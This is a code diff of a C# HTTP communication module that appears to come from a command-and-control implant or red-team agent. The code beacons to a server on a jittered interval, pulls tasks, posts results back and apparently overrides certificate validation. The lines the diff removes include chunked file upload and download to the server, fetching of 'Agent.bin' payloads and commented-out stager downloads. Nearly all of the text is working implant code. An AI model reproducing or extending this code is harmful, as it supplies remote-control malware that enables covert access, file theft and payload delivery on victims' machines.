@@ -21,20 +21,8 @@ namespace Agent.Models
         private CancellationTokenSource _tokenSource;
 
         private HttpClient _client;
-
-        private Random random = new Random();
-
-        private bool _shouldSendMetaData = false;
-
-
-
-
-        public HttpCommModule(string protocol, string connectAddress, int connectPort)
+        public HttpCommModule(MessageManager messManager) : base(messManager)
         {
-            ConnectAddress=connectAddress;
-            ConnectPort=connectPort;
-            Protocol = protocol;
-
             ServicePointManager.Expect100Continue = true;
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             ServicePointManager.ServerCertificateValidationCallback = new
@@ -48,9 +36,11 @@ namespace Agent.Models
         }
 
 
-        public override void Init(AgentMetadata metadata)
+        public void Init(string protocol, string connectAddress, int connectPort)
         {
-            base.Init(metadata);
+            ConnectAddress=connectAddress;
+            ConnectPort=connectPort;
+            Protocol = protocol;
 
             _client = new HttpClient();
             _client.Timeout = new TimeSpan(0, 0, 10);
@@ -59,31 +49,33 @@ namespace Agent.Models
             //Console.WriteLine(_client.BaseAddress);
             _client.DefaultRequestHeaders.Clear();
 
-            var encodedMetadata = Convert.ToBase64String(metadata.Serialize());
-            _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
-
+            this.IsInitialized = true;
         }
 
-        public override void SendMetaData()
+        public override async void Stop()
         {
-            this._shouldSendMetaData = true;
-        }
+            if (!this.IsRunning)
+                return;
 
+            this._tokenSource.Cancel();
+        }
 
         public override async void Start()
         {
+            this.IsRunning = false;
+            if (!this.IsInitialized)
+                return;
+
             _tokenSource = new CancellationTokenSource();
 
+            this.IsRunning = true;
             while (!_tokenSource.IsCancellationRequested)
             {
                 try
                 {
-                    if (!_outBound.IsEmpty || this._shouldSendMetaData)
-                    {
-                        await PostData(this._shouldSendMetaData);
-                        if (this._shouldSendMetaData)
-                            this._shouldSendMetaData = false;
-                    }
+                    var results = this.MessageManager.GetMessageResultsToRelay();
+                    if (results.Any())
+                        await PostData(results);
                     else
                         await this.CheckIn();
                 }
@@ -94,195 +86,37 @@ namespace Agent.Models
 #endif
                 }
 
-
-                var delta = (int)(Interval * Jitter);
-                delta = random.Next(0, delta);
-                if (random.Next(100) > 50)
-                    delta = -delta;
-                await Task.Delay(this.Interval + delta);
+                await Task.Delay(this.GetDelay());
             }
+
+            this.IsRunning = false;
         }
 
         private async Task CheckIn()
         {
-            var response = await _client.GetByteArrayAsync($"/{this._agentmetaData.Id}");
+            var response = await _client.GetByteArrayAsync($"/{this.MessageManager.AgentMetaData.Id}");
             HandleResponse(response);
         }
 
-        private async Task PostData(bool requiresMetaData = false)
+        private async Task PostData(List<MessageResult> results)
         {
-            var data = new ResultData();
-            if (requiresMetaData)
-                data.Metadata = this._agentmetaData;
+            //var ser = Encoding.UTF8.GetString(results.Serialize());
+            foreach (var resMess in results)
+            {
+                resMess.Header.Path.Insert(0,this.MessageManager.AgentMetaData.Id);
+            }
 
-            data.Results = GetOutbound().ToArray();
-            var content = new StringContent(Encoding.UTF8.GetString(data.Serialize()), Encoding.UTF8, "application/json");
-            var response = await _client.PostAsync($"/{this._agentmetaData.Id}", content);
+            var content = new StringContent(Encoding.UTF8.GetString(results.Serialize()), Encoding.UTF8, "application/json");
+            var response = await _client.PostAsync($"/{this.MessageManager.AgentMetaData.Id}", content);
             var responseContent = await response.Content.ReadAsByteArrayAsync();
             this.HandleResponse(responseContent);
         }
 
         private void HandleResponse(byte[] response)
         {
-            var tasks = response.Deserialize<AgentTask[]>();
             //string bitString = Encoding.UTF8.GetString(response, 0, response.Length);
-            if (tasks != null && tasks.Any())
-            {
-                foreach (var task in tasks)
-                    this._inbound.Enqueue(task);
-            }
+            var messages = response.Deserialize<List<MessageTask>>();
+            this.MessageManager.EnqueueTasks(messages);
         }
-
-        public override void Stop()
-        {
-            _tokenSource.Cancel();
-        }
-
-        private async Task<FileDescriptor> SetupDownload(string id)
-        {
-            var response = await _client.GetByteArrayAsync($"/SetupDownload/{id}");
-            //var json = Encoding.UTF8.GetString(response);
-            return response.Deserialize<FileDescriptor>();
-        }
-
-        private async Task<FileChunk> GetFileChunk(string id, int chunckIndex)
-        {
-            var response = await _client.GetByteArrayAsync($"/DownloadChunk/{id}/{chunckIndex}");
-            string json = Encoding.UTF8.GetString(response);
-            return response.Deserialize<FileChunk>();
-        }
-
-        private async Task SetupUpload(FileDescriptor fileDesc)
-        {
-            var content = new StringContent(Encoding.UTF8.GetString(fileDesc.Serialize()), Encoding.UTF8, "application/json");
-            var response = await _client.PostAsync("/Upload/Setup", content);
-            if (!response.IsSuccessStatusCode)
-                throw new Exception($"{response}");
-        }
-
-        private async Task PostFileChunk(FileChunk chunk)
-        {
-            var content = new StringContent(Encoding.UTF8.GetString(chunk.Serialize()), Encoding.UTF8, "application/json");
-            var response = await _client.PostAsync("/Upload/Chunk", content);
-            if (!response.IsSuccessStatusCode)
-                throw new Exception($"{response}");
-        }
-
-
-        public override async Task<Byte[]> Download(string id, Action<int> OnCompletionChanged = null)
-        {
-            var desc = await this.SetupDownload(id);
-            var chunks = new List<FileChunk>();
-
-            int progress = 0;
-            for (int index = 0; index < desc.ChunkCount; ++index)
-            {
-                var chunk = this.GetFileChunk(desc.Id, index).Result;
-                chunks.Add(chunk);
-
-                var newprogress = index * 100 / desc.ChunkCount;
-                if (progress != newprogress)
-                    OnCompletionChanged?.Invoke(progress);
-                progress = newprogress;
-            }
-            OnCompletionChanged?.Invoke(100);
-
-            using (var ms = new MemoryStream())
-            {
-                foreach (var chunk in chunks.OrderBy(c => c.Index))
-                {
-                    var bytes = Convert.FromBase64String(chunk.Data);
-                    ms.Write(bytes, 0, bytes.Length);
-                }
-
-                return ms.ToArray();
-
-            }
-        }
-
-        public const int ChunkSize = 10000;
-
-        public override async Task<string> Upload(byte[] fileBytes, string filename, Action<int> OnCompletionChanged = null)
-        {
-
-            var desc = new FileDescriptor()
-            {
-                Length = fileBytes.Length,
-                ChunkSize = ChunkSize,
-                Id = Guid.NewGuid().ToString(),
-                Name = filename
-            };
-
-            var chunks = new List<FileChunk>();
-
-            int index = 0;
-            using (var ms = new MemoryStream(fileBytes))
-            {
-
-                var buffer = new byte[ChunkSize];
-                int numBytesToRead = (int)ms.Length;
-
-                while (numBytesToRead > 0)
-                {
-
-                    int n = ms.Read(buffer, 0, ChunkSize);
-                    //var data =
-                    var chunk = new FileChunk()
-                    {
-                        FileId = desc.Id,
-                        Data = System.Convert.ToBase64String(buffer.Take(n).ToArray()),
-                        Index = index,
-                    };
-                    chunks.Add(chunk);
-                    numBytesToRead -= n;
-
-                    index++;
-                }
-            }
-
-            desc.ChunkCount = chunks.Count;
-
-            await SetupUpload(desc);
-
-            index = 0;
-            int progress = 0;
-            foreach (var chunk in chunks)
-            {
-                await PostFileChunk(chunk);
-                var newprogress = index * 100 / desc.ChunkCount;
-                if (progress != newprogress)
-                    OnCompletionChanged?.Invoke(progress);
-                index++;
-                progress = newprogress;
-            }
-            OnCompletionChanged?.Invoke(100);
-
-            return desc.Id;
-        }
-
-        //public override async Task<Byte[]> DownloadStagerDll()
-        //{
-        //    var response = await _client.GetAsync("/StagerDll");
-        //    var responseContent = await response.Content.ReadAsByteArrayAsync();
-        //    return responseContent;
-        //}
-        //public override async Task<Byte[]> DownloadStagerExe()
-        //{
-        //    var response = await _client.GetAsync("/StagerExe");
-        //    var responseContent = await response.Content.ReadAsByteArrayAsync();
-        //    return responseContent;
-        //}
-        public override async Task<Byte[]> DownloadAgentBin(bool x86 = false)
-        {
-            var filename = "Agent";
-            if (x86)
-                filename += "-x86";
-            filename += ".bin";
-            var response = await _client.GetAsync(filename);
-            var responseContent = await response.Content.ReadAsByteArrayAsync();
-            return responseContent;
-        }
-
-       
     }
 }
